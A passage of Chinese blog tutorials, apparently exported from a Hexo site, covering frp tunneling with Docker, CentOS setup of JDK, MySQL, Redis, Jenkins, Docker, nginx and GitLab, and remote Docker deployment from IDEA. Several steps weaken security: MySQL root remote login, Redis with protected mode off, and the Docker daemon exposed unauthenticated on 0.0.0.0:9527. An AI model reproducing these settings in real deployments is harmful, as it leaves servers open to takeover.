<code>&lt;![CDATA[]]&gt;</code>表示xml解析器忽略解析，所以更快。</p><p>注意：</p><ol><li>此部分不能再包含<code>”]]&gt;”</code>；</li><li>不允许嵌套使用；</li><li><code>”]]&gt;”</code>这部分不能包含空格或者换行。</li><li>mybatis中的<code>&lt;if test=&quot;&quot;&gt;&lt;/if&gt;、&lt;where&gt;&lt;/where&gt;、&lt;choose&gt;&lt;/choose&gt;、&lt;trim&gt;&lt;/trim&gt;</code> 等这些标签不能写到CDATA中。否则标签将不会被mybatis解析。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>mybatis</category>
      </categories>
      <tags>
        <tag>mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>docker安装frp内网穿透</title>
    <url>/2020/08/05/57486/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><h2 id="创建frp配置文件"><a href="#创建frp配置文件" class="headerlink" title="创建frp配置文件"></a>创建frp配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建frp文件夹</span></span><br><span class="line">mkdir -p frp &amp;&amp; cd frp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建frps.ini</span></span><br><span class="line">cat &lt;&lt;EOF&gt; frps.ini</span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制如下配置，自行修改密码</span></span><br><span class="line">[common]</span><br><span class="line">bind_port = 10000</span><br><span class="line">vhost_http_port = 10001</span><br><span class="line">vhost_https_port = 10002</span><br><span class="line">dashboard_addr = 0.0.0.0</span><br><span class="line">dashboard_port = 10003</span><br><span class="line">dashboard_user = zyj</span><br><span class="line">dashboard_pwd = xxx</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="启动docker容器"><a href="#启动docker容器" class="headerlink" title="启动docker容器"></a>启动docker容器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建启动脚本</span></span><br><span class="line">cat &lt;&lt;EOF&gt; start.sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制如下配置，挂载容器的frps.ini目录请自行修改</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">docker run -d \\</span><br><span class="line">    --restart always \\</span><br><span class="line">    --network host \\</span><br><span class="line">    --name frps \\</span><br><span class="line">    -v /usr/local/project/frp/frps.ini:/etc/frp/frps.ini \\</span><br><span class="line">    snowdreamtech/frps</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行脚本</span></span><br><span class="line">sh start.sh</span><br></pre></td></tr></table></figure><p>访问<code>公网ip:10003</code>，输入账号密码，看到frp管理界面。</p><h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><h2 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h2><p>下载客户端<a href="https://github.com/fatedier/frp/releases/download/v0.30.0/frp_0.30.0_windows_amd64.zip" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/download/v0.30.0/frp_0.30.0_windows_amd64.zip</a></p><p>解压，修改<code>frpc.ini</code>文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 公网ip</span></span><br><span class="line">server_addr = 255.255.255.255</span><br><span class="line">server_port = 10000</span><br><span class="line"></span><br><span class="line">[portal]</span><br><span class="line">type = http</span><br><span class="line"><span class="meta">#</span><span class="bash"> 本地服务端口</span></span><br><span class="line">local_port = 8081</span><br><span class="line"><span class="meta">#</span><span class="bash"> 公网ip或者域名</span></span><br><span class="line">custom_domains = 255.255.255.255</span><br></pre></td></tr></table></figure><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><ol><li>创建frp配置文件,remote_port记得在公网放开防火墙</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建frp文件夹</span></span><br><span class="line">mkdir -p frp &amp;&amp; cd frp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建frps.ini</span></span><br><span class="line">cat &lt;&lt;EOF&gt; frps.ini</span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制如下配置</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 公网ip</span><br><span class="line">server_port = 10000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line"></span><br><span class="line">[nginx]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 80</span><br><span class="line">remote_port = 6001</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><ol start="2"><li>启动docker容器</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建启动脚本</span></span><br><span class="line">cat &lt;&lt;EOF&gt; start.sh</span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制如下配置，挂载容器的frps.ini目录请自行修改</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">docker run -d \\</span><br><span class="line">    --restart always \\</span><br><span class="line">    --network host \\</span><br><span class="line">    --name frpc \\</span><br><span class="line">    -v /usr/project/frp/frpc.ini:/etc/frp/frpc.ini \\</span><br><span class="line">    snowdreamtech/frpc</span><br><span class="line">EOF</span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行脚本</span></span><br><span class="line">sh start.sh</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>部署</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7安装jdk、docker</title>
    <url>/2020/07/29/13516/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h1><ol><li><p>oracle官网下载JDk：jdk-8u261-linux-x64.rpm</p></li><li><p>安装JDK8：</p></li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh jdk-8u261-linux-x64.rpm</span><br></pre></td></tr></table></figure><ol><li>配置环境变量</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><ol start="3"><li>输入以下内容：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">JAVA_HOME=/usr/java/jdk1.8.0_261-amd64</span><br><span class="line">JRE_HOME=/usr/java/jdk1.8.0_261-amd64/jre</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib</span><br><span class="line">export JAVA_HOME JRE_HOME PATH CLASSPATH</span><br></pre></td></tr></table></figure><a id="more"></a><p>然后执行以下命令生效：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><h1 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载mysql</span></span><br><span class="line">wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.11-linux-glibc2.12-x86_64.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxvf mysql-8.0.11-linux-glibc2.12-x86_64.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建data文件夹</span></span><br><span class="line">mkdir data</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 在/etc目录下创建my.cnf文件</span></span><br><span class="line">vim /etc/my.cnf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将以下内容写入</span></span><br><span class="line">[mysqld]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置3306端口</span></span><br><span class="line">port=3306</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置mysql的安装目录</span></span><br><span class="line">basedir=/usr/project/mysql</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置mysql数据库的数据的存放目录</span></span><br><span class="line">datadir=/usr/project/mysql/data</span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许最大连接数/</span></span><br><span class="line">max_connections=10000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许连接失败的次数。这是为了防止有人从该主机试图攻击数据库系统</span></span><br><span class="line">max_connect_errors=10</span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务端使用的字符集默认为UTF8</span></span><br><span class="line"><span class="meta">#</span><span class="bash">character-set-server=UTF8</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建新表时将使用的默认存储引擎</span></span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line"><span class="meta">#</span><span class="bash"> 默认使用“mysql_native_password”插件认证</span></span><br><span class="line">default_authentication_plugin=mysql_native_password</span><br><span class="line">[mysql]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置mysql客户端默认字符集</span></span><br><span class="line">default-character-set=utf8</span><br><span class="line">[client]</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置mysql客户端连接服务端时默认使用的端口</span></span><br><span class="line">port=3306</span><br><span class="line">default-character-set=utf8</span><br><span class="line">user=mysql</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 用户组</span></span><br><span class="line">groupadd mysql</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用户 （用户名/密码）</span></span><br><span class="line">useradd -g mysql mysql</span><br><span class="line"><span class="meta">#</span><span class="bash"> 授权</span></span><br><span class="line">chown -R mysql.mysql /usr/project/mysql/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 切换mysql账户</span></span><br><span class="line">su mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化mysql，注意保存root账户的密码</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现错误：bin/mysqld: error <span class="keyword">while</span> loading shared libraries: libnuma.so.1: 安装mysql</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> centos yum -y install numactl</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ubuntu sudo apt-get install numactl</span></span><br><span class="line">./bin/mysqld --initialize</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动mysql</span></span><br><span class="line">cd support-files/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现错误：找不到mysql_safe,修改mysql.server的basedir和datadir</span></span><br><span class="line">./mysql.server start</span><br><span class="line"><span class="meta">#</span><span class="bash"> 退出mysql账户，登录mysql</span></span><br><span class="line">./bin/mysql -uroot -p</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改mysql密码</span></span><br><span class="line">alter user 'root'@'localhost' identified by 'xxxxxx';</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改root账户远程登录（谨慎操作）</span></span><br><span class="line">update user set host='%' where user='root' and host='localhost';</span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新</span></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 将mysql加入到服务中</span></span><br><span class="line">cp /usr/project/mysql/support-files/mysql.server /etc/init.d/mysql</span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加开机启动</span></span><br><span class="line">chkconfig mysql on</span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭mysql</span></span><br><span class="line">systemctl stop mysql</span><br></pre></td></tr></table></figure><h1 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载tomcat，或者https://tomcat.apache.org/download-90.cgi官网下载</span></span><br><span class="line"></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-9/v9.0.37/bin/apache-tomcat-9.0.37.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxv -f apache-tomcat-9.0.37.tar.gz</span><br></pre></td></tr></table></figure><h1 id="安装maven"><a href="#安装maven" class="headerlink" title="安装maven"></a>安装maven</h1><h1 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载redis</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.3.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxvf redis-5.0.3.tar.gz</span><br><span class="line">cd redis-5.0.3</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译redis</span></span><br><span class="line">make install PREFIX=/usr/project/redis</span><br><span class="line">cp /usr/project/redis-5.0.3/redis.conf /usr/project/redis/bin/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改redis.conf</span></span><br><span class="line">daemonize yes</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置密码，取消requirepass注释</span></span><br><span class="line">requirepass xxx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 取消保护模式（谨慎操作）</span></span><br><span class="line">protected-mode no</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注释掉 <span class="built_in">bind</span> 127.0.0.1（谨慎操作）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动redis</span></span><br><span class="line">./redis-server redis.conf</span><br></pre></td></tr></table></figure><h1 id="安装Jenkins"><a href="#安装Jenkins" class="headerlink" title="安装Jenkins"></a>安装Jenkins</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载Jenkins，清华大学开源软件镜像站</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/jenkins/war/latest/jenkins.war</span><br></pre></td></tr></table></figure><p>编写启动脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim run.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">nohup java -jar jenkins.war --httpPort=6004</span><br></pre></td></tr></table></figure><p>或者放到tomcat中，修改tomcat</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#添加Context标签，访问端口直接指向jenkins</span><br><span class="line"><span class="tag">&lt;<span class="name">Host</span> <span class="attr">name</span>=<span class="string">"localhost"</span> <span class="attr">appBase</span>=<span class="string">"webapps"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">unpackWARs</span>=<span class="string">"true"</span> <span class="attr">autoDeploy</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">"/"</span> <span class="attr">docBase</span>=<span class="string">"jenkins"</span> <span class="attr">reloadable</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">              /Host&gt;</span><br></pre></td></tr></table></figure><p>根据提示粘贴密码验证</p><p>安装推荐的插件，大概率下载不下来，进去jenkins中，在<code>管理Jenkins-&gt;插件管理中选择高级选项卡</code>，升级站点输入，提交。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;jenkins&#x2F;updates&#x2F;update-center.json</span><br></pre></td></tr></table></figure><h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 2: 添加软件源信息</span></span><br><span class="line">sudo yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 3: 更新并安装Docker-CE</span></span><br><span class="line">sudo yum makecache fast</span><br><span class="line">sudo yum -y install docker-ce</span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 4: 开启Docker服务</span></span><br><span class="line">sudo service docker start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 官方软件源默认启用了最新的软件，您可以通过编辑软件源的方式获取各个版本的软件包。例如官方并没有将测试版本的软件源置为可用，您可以通过以下方式开启。同理可以开启各种测试版本等。</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/yum.repos.d/docker-ee.repo</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   将[docker-ce-test]下方的enabled=0修改为enabled=1</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装指定版本的Docker-CE:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Step 1: 查找Docker-CE的版本:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum list docker-ce.x86_64 --showduplicates | sort -r</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Loading mirror speeds from cached hostfile</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Loaded plugins: branch, fastestmirror, langpacks</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   docker-ce.x86_64            17.03.1.ce-1.el7.centos            docker-ce-stable</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   docker-ce.x86_64            17.03.1.ce-1.el7.centos            @docker-ce-stable</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   docker-ce.x86_64            17.03.0.ce-1.el7.centos            docker-ce-stable</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Available Packages</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Step2: 安装指定版本的Docker-CE: (VERSION例如上面的17.03.0.ce.1-1.el7.centos)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sudo yum -y install docker-ce-[VERSION]</span></span><br></pre></td></tr></table></figure><h2 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看docker镜像</span></span><br><span class="line">docker images</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除镜像</span></span><br><span class="line">docker rmi xxx（容器名称或id）</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看docker容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除容器</span></span><br><span class="line">docker rm xxx（容器名称或id）</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看日志</span></span><br><span class="line">docker logs xxx（容器名称或id）</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入容器内部</span></span><br><span class="line">docker exec -it xxx（容器名称或id） /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash"> 从主机复制到容器</span></span><br><span class="line">docker cp host_path containerID:container_path</span><br><span class="line"><span class="meta">#</span><span class="bash"> 从容器复制到主机</span></span><br><span class="line">docker cp containerID:container_path host_path</span><br></pre></td></tr></table></figure><h2 id="docker安装nginx"><a href="#docker安装nginx" class="headerlink" title="docker安装nginx"></a>docker安装nginx</h2><ol><li><p>拉取nginx镜像：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建挂载目录</span></span><br><span class="line">mkdir -p /usr/project/nginx/html</span><br><span class="line">mkdir -p /usr/project/nginx/logs</span><br><span class="line">mkdir -p /usr/project/nginx/conf</span><br></pre></td></tr></table></figure></li><li><p>上传nginx配置文件到/usr/project/nginx/conf目录下</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#user  nobody;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">#error_log  logs&#x2F;error.log;</span><br><span class="line">#error_log  logs&#x2F;error.log  notice;</span><br><span class="line">#error_log  logs&#x2F;error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs&#x2F;nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">    #log_format  main  &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39;</span><br><span class="line">    #                  &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39;</span><br><span class="line">    #                  &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs&#x2F;access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    #keepalive_timeout  0;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs&#x2F;host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #error_page  404              &#x2F;404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page &#x2F;50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  &#x2F;50x.html;</span><br><span class="line">        location &#x3D; &#x2F;50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http:&#x2F;&#x2F;127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        #    fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  &#x2F;scripts$fastcgi_script_name;</span><br><span class="line">        #    include        fastcgi_params;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache&#39;s document root</span><br><span class="line">        # concurs with nginx&#39;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ &#x2F;\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # another virtual host using mix of IP-, name-, and port-based configuration</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       8000;</span><br><span class="line">    #    listen       somename:8080;</span><br><span class="line">    #    server_name  somename  alias  another.alias;</span><br><span class="line"></span><br><span class="line">    #    location &#x2F; &#123;</span><br><span class="line">    #        root   &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    #server &#123;</span><br><span class="line">    #    listen       443 ssl;</span><br><span class="line">    #    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #    ssl_certificate      cert.pem;</span><br><span class="line">    #    ssl_certificate_key  cert.key;</span><br><span class="line"></span><br><span class="line">    #    ssl_session_cache    shared:SSL:1m;</span><br><span class="line">    #    ssl_session_timeout  5m;</span><br><span class="line"></span><br><span class="line">    #    ssl_ciphers  HIGH:!aNULL:!MD5;</span><br><span class="line">    #    ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">    #    location &#x2F; &#123;</span><br><span class="line">    #        root   html;</span><br><span class="line">    #        index  index.html index.htm;</span><br><span class="line">    #    &#125;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>创建容器：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run --name nginx -d -p 80:80  \</span><br><span class="line">-v /usr/project/nginx/conf/nginx.conf:/etc/nginx/nginx.conf  \</span><br><span class="line">-v /usr/project/nginx/html:/usr/share/nginx/html \</span><br><span class="line">-v /usr/project/nginx/logs:/var/log/nginx nginx</span><br></pre></td></tr></table></figure><h2 id="docker安装gitlab"><a href="#docker安装gitlab" class="headerlink" title="docker安装gitlab"></a>docker安装gitlab</h2><ol><li>拉取镜像</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull gitlab/gitlab-ce:latest</span><br></pre></td></tr></table></figure><ol start="2"><li>启动容器</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> --hostname是配置宿主机的ip（克隆时的地址），否则ip为容器ID</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 6003端口为http端口，6002端口为ssh克隆端口</span></span><br><span class="line">docker run -d \</span><br><span class="line">	--hostname 255.255.255.255 \</span><br><span class="line">    -p 8443:443 -p 6003:80 -p 6002:22 \</span><br><span class="line">    --name gitlab \</span><br><span class="line">    -v /usr/project/gitlab/config:/etc/gitlab \</span><br><span class="line">    -v /usr/project/gitlab/logs:/var/log/gitlab \</span><br><span class="line">    -v /usr/project/gitlab/data:/var/opt/gitlab \</span><br><span class="line">    gitlab/gitlab-ce:latest</span><br></pre></td></tr></table></figure><p>在生成的挂载目录gitlab/config下，找到gitlab.rb文件修改gitlab_rails[‘gitlab_shell_ssh_port’] = 6002。</p><p>这里遇到点问题，安装完成后，ssh克隆正常，但是http方式，url上却少了6003端口，为默认的80端口。</p><p>这里采取进入容器内部<code>/opt/gitlab/embedded/service/gitlab-rails/config/gitlab.yml</code>，修改其端口为6003，执行<code>gitlab-ctl restart</code>重启gitlab解决。相对比较麻烦！后续看有没有其他方便点的操作。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>部署</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA-docker远程部署及调试springboot</title>
    <url>/2020/07/17/56061/</url>
    <content><![CDATA[<!-- build time:Fri Apr 29 2022 10:26:31 GMT+0800 (GMT+08:00) --><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><h2 id="配置docker的远程端口"><a href="#配置docker的远程端口" class="headerlink" title="配置docker的远程端口"></a>配置docker的远程端口</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 修改docker.service支持远程访问</span></span><br><span class="line">vim /usr/lib/systemd/system/docker.service</span><br><span class="line"><span class="meta">#</span><span class="bash"> ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span></span><br><span class="line">ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:9527 -H unix:///var/run/docker.sock</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通知docker服务做出的修改</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启docker</span></span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="IDEA连接远程服务器Docker"><a href="#IDEA连接远程服务器Docker" class="headerlink" title="IDEA连接远程服务器Docker"></a>IDEA连接远程服务器Docker</h2><p>idea，settings搜索docker,没有请先安装docker插件。</p><p><img src="/2020/07/17/56061/1.png" alt="1594951904"></p><p>显示docker images及container</p><p><img src="/2020/07/17/56061/2.png" alt="1594951904"></p><h2 id="远程部署服务"><a href="#远程部署服务" class="headerlink" title="远程部署服务"></a>远程部署服务</h2><p>在src/main下新建docker文件夹，新建Dockerfile文件</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> java:<span class="number">8</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> zyj &lt;<span class="number">1769072244</span>@qq.com&gt;</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /tmp</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> railway-platform-1.0.0-release.jar app.jar</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> bash -c <span class="string">'touch /app.jar'</span></span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8085</span> <span class="number">11005</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">"java"</span>,<span class="string">"-Djava.security.egd=file:/dev/./urandom"</span>,<span class="string">"-jar"</span>,<span class="string">"/app.jar"</span>]</span></span><br><span class="line"><span class="comment">#ENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=11005","/app.jar"]</span></span><br><span 